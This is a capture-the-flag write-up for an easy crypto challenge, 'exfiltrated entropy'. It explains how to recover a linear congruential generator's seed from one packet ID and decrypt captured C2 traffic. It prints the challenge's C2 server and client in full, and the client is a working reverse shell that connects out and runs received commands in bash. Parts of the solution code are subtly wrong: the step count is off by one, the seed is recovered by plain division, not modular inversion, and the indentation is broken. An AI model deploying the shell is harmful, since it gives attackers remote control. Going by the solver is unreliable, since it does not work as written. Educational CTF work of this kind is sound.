![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /><font size='5'>exfiltrated entropy</font>

​	18<sup>th</sup> November 2024 / Document No. D24.102.230

​	Prepared By: `rasti`

​	Challenge Author(s): `rasti`

​	Difficulty: <font color=green>Easy</font>

​	Classification: Official







# Synopsis

- The players have to identify the weak implementation of LCG used by a C2 server and client communication. The task is to take the first packet id, which is a non-truncated output of the LCG, and recover the seed of the LCG by solving an equation with one variable. Looking at the plaintext length, one can identify exactly which lcg output was used for the packet id. Knowing the seed, the player can decrypt the traffic and find the command that echoes the encoded flag in the terminal.

# Description

- An intercepted signal from the Frontier Board carries fragments of hidden directives, veiled in layers of complexity. Unlocking its secrets could reveal their plans and disrupt their control. Will you decipher the commands and turn the tide in the struggle for the Frontier?



## Skills Required

- Basic knowledge of how C2 servers operate
- Basic knowledge of the LCG prng
- Familiar with stream ciphers



## Skills Learned

- Understand why LCGs are insecure to use for any cryptosystem
- Decrypt C2 traffic due to weak cryptography
- Represent the LCG symbolically and solve for the seed given any output

# Enumeration

In this challenge, we are provided with four files:

- `traffic18112024.pcap` : A file with the captured packets from the communication between the malicious C2 server and the client.
- `client.py` : The python script that was running in the client machine during the capture of the C2 traffic. This machine was used by the malicious command-and-control (C2) server to run commands on.
- `server.py` : The python script that was running on the malicious C2 server during the capture of the traffic. The server was used to execute commands on the victim (client) machine.
- `params.py` : The parameters of the PRNG used by the server and the client. More specifically, the PRNG is the Linear Congruential Generator (LCG).

## Analyzing the source code

Starting with the sever and client scripts we can see that they are very similar. The only thing that differs is that the server sends commands to the client for execution and the client receives the commands and executes them.

Let's look at the server script.

```python
from pwn import *
from params import *
from secret import SEED
from base64 import b64encode as be, b64decode as bd
import json

class LCG:
    def __init__(self):
        self.state = SEED
        self.a = a
        self.b = b
        self.m = m
    
    def _next(self):
        self.state = (self.a * self.state + self.b) % self.m
        return self.state
    
    def generate_key(self, l):
        return bytes([self._next() & 0xff for _ in range(l)])

    def generate_packet_uuid(self):
        return hex(self._next())

    def encrypt(self, msg):
        key = self.generate_key(len(msg))
        return xor(msg, key)
    
    def decrypt(self, msg):
        return self.encrypt(msg)


# context.log_level = 'debug'

l = listen(1337)
l.wait_for_connection()

lcg = LCG()
init = False

while True:
    cmd = input('/home/v1ctim/Desktop> ').encode()
    enc_cmd = lcg.encrypt(cmd)
    
    if init:
        uuid = lcg.generate_packet_uuid()
        l.sendline(json.dumps({'init': init, 'id': uuid[2:], 'cmd': be(enc_cmd).decode()}).encode())
    else:
        l.sendline(json.dumps({'init': init, 'cmd': be(enc_cmd).decode()}).encode())
        init = True

    if cmd == b'exit':
        l.close()
        break

    enc_out = bd(l.recvline())
    data = lcg.decrypt(enc_out)
    print(data)
    l.clean()
```

Essentially, the server operates as following.

The server listens to the port 1337. This is the port in which the victim machine will connect to later on. Then, an object of the LCG prng is initialized. The LCG will be used to generate the XOR keys for the encryption/decryption of the packets. The call to `input()` simulates the reverse shell on the victim machine in which the malicious actors can execute any command. However, the command is not sent to the client in plaintext. It is first encrypted using `lcg.encrypt()` which essentially XORs the command with a randomly generated key derived from the LCG prng. We will analyze the crypto operations later.

Moreover, a packet id is generated for each packet, except the first one. The `init` variable is used to determine whether the current packet is the first one or not. The ID is also derived from the LCG. The encrypted command is sent to the client base64-encoded so as the client response. Therefore, when the server receives the response, it base64-decodes it and echoes it to the output.

Now, let us see the client script too. The LCG class remains exactly the same so we will redact it.

```python
from pwn import *
from params import *
from secret import SEED
from base64 import b64decode as bd, b64encode as be
import json, subprocess

class LCG:
    # exactly the same as in server.py

r = remote('192.168.64.1', 1337)

lcg = LCG()

while True:
    data = json.loads(r.recvline())
    enc_cmd = bd(data['cmd'].encode())
    init = data['init']
    
    cmd = lcg.decrypt(enc_cmd).decode()

    if init:
        lcg.generate_packet_uuid()
    else:
        init = True
    
    if cmd == b'exit':
        r.close()
        break
    try:
        out = subprocess.check_output(['bash', '-c', cmd])
        enc_out = lcg.encrypt(out)
        r.sendline(be(enc_out))
    except:
        break

    r.clean()
```

Similarly, the client works as following. It decrypts the received command from the server and executes it using `bash`. Finally, it encrypts the response and sends it back to the server base64-encoded.

Even though the flow of both scripts is straight forward, there are a couple of things to note.

Both server and client implement exactly the same cryptosystem and both use the same seed for the PRNG. This enables them to generate the exact same output sequences. Moreover, while the client does not use the packet IDs somehow, it has to call the same method `generate_packet_uuid` as the server, otherwise their outputs would not align.

```python
if init:
    lcg.generate_packet_uuid()
else:
    init = True
```

Let us make this more clear. Let $S_i$ be the $i$-th output of the LCG prng. Suppose the server wants to execute two commands; `ls` and `pwd`. Recall that the first time, `generate_packet_uuid` is not called.

1. Server encrypts `ls`. This command has length 2 bytes and therefore it requires two outputs from the LCG; $S_1$ and $S_2$​. $S_0$ is the seed. For the encryption/decryption, only the last byte of the LCG outputs is used.

```python
def generate_key(self, l):
		return bytes([self._next() & 0xff for _ in range(l)])
```

2. The client decrypts `ls`. To be successfully decrypted, they need to generate the same outputs $S_1$ and $S_2$.
3. The server encrypts the second command, `pwd`, which has a length of 3. Therefore, they need to generate $S_3,\ S_4,\ S_5$. Since it is the second command, a UUID is generated too. The UUID is just a single output, as shown below. Finally, the server generated $S_3, S_4, S_5$ **and** $S_6$.

```python
def generate_packet_uuid(self):
		return hex(self._next())
```

4. The client generates $S_3,\ S_4,\ S_5$ to decrypt the `pwd` command but it should not stop here. It also has to call `generate_packet_uuid` to produce $S_6$ too so that both the server and the client are aligned and start from $S_7$ for the next command.

## Parameter analysis

Let us briefly inspect the LCG parameters; that is the `params.py` file.

```python
a = 0xa1d41ebef9c575ac113fcfd5ac8dbda9
b = 0x8dcf3cf766e0b6c30e753416a70e2367
m = 0x100000000000000000000000000000000
```

Recall that the LCG has the following form.
$$
S_i = a \cdot S_{i-1} + b \pmod m
$$
where,

- $i \geq 1$
- $S_0$ is the seed of the PRNG
- $a,b \in [0, m-1]$​
- $S_i$ the output of the PRNG.

One can perform extensive cryptanalysis to the LCG parameters, for example, related to the LCG period. Most likely, this will not have any success as the LCG parameters satisfy the following requirements:

```python
from secrets import randbelow
from Crypto.Util.number import GCD

m = 2**128
while True:
    a = randbelow(m-2)
    b = randbelow(m-2)
    if GCD(b, m) == 1 and (a - 1) % 2 == 0 and (a - 1) % 4 == 0:
    		break

with open('params.py', 'w') as f:
		f.write(f'a = 0x{a:x}\n')
    f.write(f'b = 0x{b:x}\n')
    f.write(f'm = 0x{m:x}\n')
```

According to [this](https://en.wikipedia.org/wiki/Linear_congruential_generator#m_a_power_of_2,_c_%E2%89%A0_0) Wikipedia section, this is the standard way to generate LCG parameters that produce maximum period LCGs. These requirements are referred to as the `Hull-Dobell Theorem`.

# Solution

Since the LCG parameters are secure we have to direct our analysis elsewhere to find the actual vulnerability.

## Finding the vulnerability

It turns out that knowing at least one LCG output, is enough to recover the seed $S_0$. This arises from the fact that each LCG output can be written in terms of the initial seed. Any LCG output can be written as:
$$
S_i = A \cdot S_0 + B \pmod m
$$
for some $A, B$ which are known and depend on $a,\ b$. Consequently, knowing $A,B,m$ and the LCG output $S_i$, we can solve for $S_0$ as:
$$
S_0 = A^{-1} \cdot (S_i - B) \pmod m
$$
Recall that, in this challenge, some of the LCG outputs are used as packet IDs. `generate_packet_uuid` returns the entire value of `.next()` without truncating any part of the integer, which enables us to recover the seed given a single packet ID. However, we still have to identify $i, A, B$ from the equation above.

## Solving for the seed $S_0$

Since the encryption/decrryption is just XOR, the length of the plaintext is the same as the ciphertext. As a result, we know exactly which LCG outputs were used each time.

Opening the pcap in wireshark, we find the first two encrypted commands (base64-encoded):

- `ocXzAq8Q`
- `kn4=`

By Base64-decoding them, we find that:

```python
>>> from base64 import b64decode
>>> len(b64decode(b'ocXzAq8Q'))
6
>>> len(b64decode(b'kn4='))
2
>>>
```

We conclude that the lcg outputs were used as follows:

- $S_1$ : Encryption of first command
- $S_2$ : Encryption of first command
- $S_3$ : Encryption of first command
- $S_4$ : Encryption of first command
- $S_5$ : Encryption of first command
- $S_6$ : Encryption of first command
- $S_7$ : Encryption of first response
- $S_8$ : Encryption of first response
- $S_9$ : Encryption of first response
- $S_{10}$ : Encryption of first response
- $S_{11}$ : Encryption of first response
- $S_{12}$ : Encryption of first response
- $S_{13}$​ : Encryption of second command
- $S_{14}$​ : Encryption of second command
- $S_{15}$ : ID of the second packet

This means that we know the $15$-th output of the LCG. To find $A, B$, we can do it with pen and paper but we will use SageMath to symbolically represent the LCG in terms of the seed $S_0$. We can define a variable in the polynomial ring of $\mathbb{Z}/_{m}\mathbb{Z}$ and execute the LCG to get $A,B$.

```python
def symbolic_execute_lcg(a, b, m):
    R = PolynomialRing(Zmod(m), 's0')
    s0 = R.gen()

    for _ in range(14):
        s0 = a*s0 + b
        
		return s0
```

Printing out the result, we get:

```python
sage: s0
267550183169270268636265104241123641329*s0 + 260741887032638507463174920287764120234
sage:
```

Therefore:
$$
A = 267550183169270268636265104241123641329\\
B = 260741887032638507463174920287764120234
$$
Now, we know everything to solve for $S_0$​.

Looking at the pcap, we get the packet uuid : $S_{15} = \text{0xeba14c429a64b2251717da016e096091}$.

```python
def recover_seed(s0):
		uuid = 0xeba14c429a64b2251717da016e096091
		coeffs = list(s0)
		seed = int((uuid - coeffs[0]) / coeffs[1])
    return seed
```

Now, we can decrypt the C2 traffic. It turns out that the last command is:

```python
echo "H4sIAAE4/WYAA+1 ... <REDACTED> ... KnivUiAAA=" | base64 -d | gunzip
```

By copy pasting this line in any bash terminal, we see the flag printed with ASCII art.

Finally, let us write a function that decrypts the traffic and prints the commands and the responses.

```python
from base64 import b64decode

def decrypt_traffic(seed):
		lcg = LCG(seed)
    
    encs = ["extracted", "from", "pcap", ...]	# one can use pyshark to extract the data

    for i in range(0, len(encs), 2):
    		cmd = lcg.decrypt(b64decode(encs[i].encode()))

        if i != 0:
            lcg.generate_packet_uuid()

        if i == len(encs) - 1:
            print("ENTER IN ANY *NIX TERMINAL :",cmd.decode())	# the last command echoes the flag in terminal

        if i + 1 < len(encs):
            response = lcg.decrypt(b64decode(encs[i+1].encode()))
            # print(response)	# for debugging purposes, we can optionally see the client responses
```

# Getting the flag

A final summary of all that was said above:

1. Find out that both the server and client implement the same cryptosystem. That is, a stream cipher for encrypting/decrypting their packets and the same seed for an LCG prng.
2. Notice that knowing a single LCG output, can result in seed recovery by solving a simple linear equation.
3. Knowing the seed, we can decrypt the C2 traffic

This recap can be represented by code with the `pwn()` function:

```python
from params import *

def pwn():
  	s0 = symbolic_execute_lcg(a, b, m)
    seed = recover_seed(s0)
    decrypt_traffic(seed)
  
if __name__ == '__main__':
  	pwn()
```
